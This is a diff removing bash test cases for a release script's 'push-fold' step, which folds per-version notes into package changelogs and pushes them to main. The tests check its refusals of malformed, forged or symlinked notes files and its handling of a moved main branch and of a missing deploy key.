-check "push-fold: every old line of a changelog stays, in order" "$(kept "$rel_log" "$new_rel")"
-check "push-fold: both versions go below the higher one present, newest first, above [Unreleased]" \
-  "$(is "$new_rel" '# Changelog
-
-## [2.0.0] - 2026-01-01
-
-### Added
-
-- a release on top
-
-## [1.10.0] - 2026-03-04
-
-### Fixed
-
-- the second entry
-  continued
-
-## [1.9.0] - 2026-03-02
-
-### Added
-
-- the first entry
-- another entry
-
-## [Unreleased]
-
-### Added
-
-- an old unreleased entry
-
-## [1.5.0]
-
-### Fixed
-
-- an old fix')"
-check "push-fold: a main@ block goes above the first ## line" \
-  "$(is "$(git -C "$o" show main:packages/side/CHANGELOG.md)" "# Changelog
-
-## [$main_label] - 2026-04-11
-
-### Changed
-
-- side entries
-
-$(tail -n +3 <<<"$side_log")")"
-check "push-fold: a changelog without a ## line gets the block appended after a blank line" \
-  "$(is "$(git -C "$o" show main:packages/plain/CHANGELOG.md)" "$plain_log
-
-## [$main_label] - 2026-04-11
-
-### Added
-
-- a plain entry")"
-check "push-fold: the empty package's changelog and the unreleased entry stay" \
-  "$(git -C "$o" cat-file -e "main:packages/rel/$u/INFRA-3-third.yaml" && git -C "$o" diff --quiet "$base" main -- packages/empty && echo true || echo false)"
-
-fold_case fold-empty
-fold_specs=(packages/empty)
-push_fold
-check "push-fold, empty plan: exits 0, saying nothing to fold" "$(is "$rc|$(contains "$out" '^Nothing to fold$')" "0|true")"
-check "push-fold, empty plan: nothing written, origin untouched, gh not called" "$(is "$(untouched)" "true")"
-fold_specs=(packages/rel=rel-v packages/side packages/plain packages/empty)
-
-fold_case fold-moved
-moved=$(git -C "$fc/a" commit-tree -p "$base" -m "fix: landed meanwhile" "$base^{tree}")
-git -C "$fc/a" push -q "$fc/origin.git" "$moved:refs/heads/main"
-push_fold
-check "push-fold, main moved: exits 0" "$(is "$rc" 0)"
-check "push-fold, main moved: origin's main is left where it moved" "$(is "$(git -C "$fc/origin.git" rev-parse main)" "$moved")"
-check "push-fold, main moved: starts a run of changelog-fold.yaml on main" \
-  "$(is "$calls" "$(argv workflow run changelog-fold.yaml --repo example/repo --ref main)")"
-check "push-fold, main moved: the notice names both commits" \
-  "$(contains "$out" "^::notice title=Nothing pushed; a fresh run started::main moved from $base, the commit [0-9a-f]* was made on, to $moved, so ")"
-fold_case fold-moved-gh
-moved=$(git -C "$fc/a" commit-tree -p "$base" -m "fix: landed meanwhile" "$base^{tree}")
-git -C "$fc/a" push -q "$fc/origin.git" "$moved:refs/heads/main"
-push_fold GH_TEST_FAIL=1
-check "push-fold, main moved, gh fails: exits 1 with an ::error::" \
-  "$(is "$rc|$(contains "$out" '^::error::release-push.sh push-fold: main moved .* starting a fresh run of changelog-fold.yaml on main failed')" "1|true")"
-
-fold_case fold-rejected
-printf '#!/usr/bin/env bash\necho "rejected by the test"\nexit 1\n' > "$fc/origin.git/hooks/pre-receive"
-chmod +x "$fc/origin.git/hooks/pre-receive"
-push_fold
-check "push-fold, push rejected while main stays: exits 1 with an ::error::" \
-  "$(is "$rc|$(contains "$out" "^::error::release-push.sh push-fold: the push of [0-9a-f]* to main was rejected while main's tip is still $base")" "1|true")"
-check "push-fold, push rejected while main stays: origin untouched, gh not called" \
-  "$(is "$(git -C "$fc/origin.git" rev-parse main)|$calls" "$base|")"
-
-# fold_refused <description> <regex> [<status>]: the checks every refusal shares: exit 1, an
-# ::error:: matching <regex>, and nothing written or pushed.
-fold_refused() {
-  check "push-fold refuses $1: exits 1 with an ::error::" \
-    "$(is "$rc|$(contains "$out" "^::error::release-push.sh push-fold: $2")" "1|true")"
-  check "push-fold refuses $1: nothing written, origin untouched" "$(untouched "${3:-}")"
-}
-fold_case fold-not-base
-fold_base=$c2
-push_fold
-fold_refused "a HEAD that is not the base" "HEAD is $base, not the base $c2"
-fold_case fold-dirty
-printf 'dirt\n' >> "$fc/a/packages/rel/package.json"
-push_fold
-fold_refused "a dirty tree" "the working tree or the index differs from HEAD" " M packages/rel/package.json"
-fold_case fold-missing
-rm "$fc/notes/side_$main_label.md"
-push_fold
-fold_refused "a notes file missing" ".*notes lacks side_main@${base:0:12}\.md"
-fold_case fold-extra
-printf '### Added\n\n- smuggled\n' > "$fc/notes/rel_2.1.0.md"
-push_fold
-fold_refused "an extra notes file" ".*notes holds what the fold.s plan names no notes for: rel_2\.1\.0\.md"
-fold_case fold-empty-notes
-printf '\n  \n\n' > "$fc/notes/rel_1.10.0.md"
-push_fold
-fold_refused "an empty notes file" ".*rel_1\.10\.0\.md, the notes of packages/rel for 1\.10\.0, holds nothing but blank lines"
-fold_case fold-nul
-printf '### Added\n\n- a\000b\n' > "$fc/notes/rel_1.9.0.md"
-push_fold
-fold_refused "a notes file holding a NUL byte" ".*rel_1\.9\.0\.md, the notes of packages/rel for 1\.9\.0, holds a NUL byte"
-fold_case fold-heading
-printf '\n## [9.9.9] - forged\n' >> "$fc/notes/plain_$main_label.md"
-push_fold
-fold_refused "a notes file holding a ## line" ".*plain_main@${base:0:12}\.md, the notes of packages/plain for $main_label, holds a line starting '## '"
-fold_case fold-symlink
-rm "$fc/notes/rel_1.9.0.md" && ln -s /etc/hostname "$fc/notes/rel_1.9.0.md"
-push_fold
-fold_refused "a notes file that is a symlink" "rel_1\.9\.0\.md in .* is not a regular file"
-fold_case fold-present
-# A changelog on main that already holds the 1.9.0 heading: the base is that commit.
-git -C "$fc/a" checkout -q --detach "$base"
-printf '\n## [1.9.0] - 2026-03-02\n' >> "$fc/a/packages/rel/CHANGELOG.md"
-git -C "$fc/a" commit -q -am "docs: a 1.9.0 heading by hand"
-fold_base=$(git -C "$fc/a" rev-parse HEAD) fold_tip=$(git -C "$fc/a" rev-parse HEAD)
-git -C "$fc/a" push -q "$fc/origin.git" HEAD:refs/heads/main
-fold_specs=(packages/rel=rel-v)
-rm "$fc/notes/side_$main_label.md" "$fc/notes/plain_$main_label.md"
-push_fold
-fold_refused "a label whose heading is already there" "packages/rel/CHANGELOG.md already holds the heading ## \[1\.9\.0\]"
-fold_specs=(packages/rel=rel-v packages/side packages/plain packages/empty)
-fold_case fold-no-key
-push_fold DEPLOY_KEY=
-fold_refused "a missing DEPLOY_KEY" "DEPLOY_KEY is unset or empty"
-check "push-fold refuses a missing DEPLOY_KEY: nothing is made in TMPDIR" "$(is "$left" 0)"
-
-# A release tag pushed between the two jobs: the build planned and rendered without it, and the
-# publish job's checkout fetches every tag again, so its plan holds a group the notes lack. A
-# release workflow running beside the fold does this (the listener pushes its tag in its publish
-# job). The fold of that run must not fail the run, and must not delete a fragment it holds no
-# notes for.
-fold_case fold-tag-between-jobs
-git -C "$fc/a" tag rel-v1.11.0 "$base"
-push_fold
-third_kept=$(git -C "$fc/origin.git" cat-file -e "main:packages/rel/$u/INFRA-3-third.yaml" 2>/dev/null && echo true || echo false)
-check "push-fold, a release tag pushed between the jobs: exits 0 and keeps the fragment the notes do not hold" \
-  "$(is "$rc|$third_kept" "0|true")"
-
-# The same run folds every group the notes hold, as a run without the new tag does (fold-accepted
-# above), and names the group it defers.
-o="$fc/origin.git"
-accepted="$work/fold-accepted/origin.git"
-check "push-fold, a release tag pushed between the jobs: origin's main is one commit over the base" \
-  "$(is "$(git -C "$o" rev-list --count "$base..main")|$(git -C "$o" log -1 --format=%P main)" "1|$base")"
-check "push-fold, a release tag pushed between the jobs: the groups the notes hold land, their fragments gone and nothing else changed" \
-  "$(is "$(git -C "$o" diff --name-status "$base" main)" "$(git -C "$accepted" diff --name-status "$base" main)")"
-check "push-fold, a release tag pushed between the jobs: their blocks are in the changelogs, and the deferred version's is not" \
-  "$(is "$(git -C "$o" show main:packages/rel/CHANGELOG.md)|$(git -C "$o" show main:packages/side/CHANGELOG.md)|$(git -C "$o" show main:packages/plain/CHANGELOG.md)" \
-    "$(git -C "$accepted" show main:packages/rel/CHANGELOG.md)|$(git -C "$accepted" show main:packages/side/CHANGELOG.md)|$(git -C "$accepted" show main:packages/plain/CHANGELOG.md)")"
-check "push-fold, a release tag pushed between the jobs: a notice names the deferred package and label" \
-  "$(contains "$out" '^::notice title=Fold deferred::packages/rel 1\.11\.0 is not folded in this run and its fragments stay on main: .*its release tag is newer than the build; a later run folds it')"
-check "push-fold, a release tag pushed between the jobs: one notice, for that group alone" \
-  "$(is "$(grep -c 'title=Fold deferred' <<<"$out")" 1)"
-
-# Every group of the plan is a version group the notes lack: nothing is left to fold.
-fold_case fold-all-deferred
-fold_specs=(packages/rel=rel-v)
-git -C "$fc/a" tag rel-v1.11.0 "$base"
-rm "$fc/notes/rel_1.9.0.md" "$fc/notes/rel_1.10.0.md" "$fc/notes/side_$main_label.md" "$fc/notes/plain_$main_label.md"
-push_fold
-check "push-fold, every group deferred: exits 0, saying nothing is folded in this run" \
-  "$(is "$rc|$(contains "$out" '^Nothing to fold in this run: every group of the plan is deferred')" "0|true")"
-check "push-fold, every group deferred: a notice for each group, in the plan's order" \
-  "$(is "$(sed -n 's/^::notice title=Fold deferred::\(packages\/rel [0-9.]*\) is not folded in this run.*/\1/p' <<<"$out")" "packages/rel 1.9.0
-packages/rel 1.10.0
-packages/rel 1.11.0")"
-check "push-fold, every group deferred: nothing written, origin untouched, gh not called" "$(is "$(untouched)" "true")"
-fold_specs=(packages/rel=rel-v packages/side packages/plain packages/empty)
-
-# Only a notes name that does not exist at all defers its group: one that is there as a symlink,
-# even a dangling one, is refused as the build's fault.
-fold_case fold-deferred-symlink
-git -C "$fc/a" tag rel-v1.11.0 "$base"
-ln -s "$fc/nowhere" "$fc/notes/rel_1.11.0.md"
-push_fold
-fold_refused "a version group's notes that are a dangling symlink" "rel_1\.11\.0\.md in .* is not a regular file"
-check "push-fold refuses a version group's notes that are a dangling symlink: defers nothing" \
-  "$(is "$(contains "$out" 'Fold deferred')" false)"
-
-summary "release-push.sh version, push-main, tagged, tag, release, push-tag, check-built, extract-built, push-built, handed, no-credential, fold-plan, fold-orphans and push-fold"
-
+summary "release-push.sh version, tagged, tag, pair-version, release, release-section, push-tag, check-built, extract-built, handed, no-credential, fold-notes, fold-check and fold-orphans, and release.yaml's worker_image_release step"
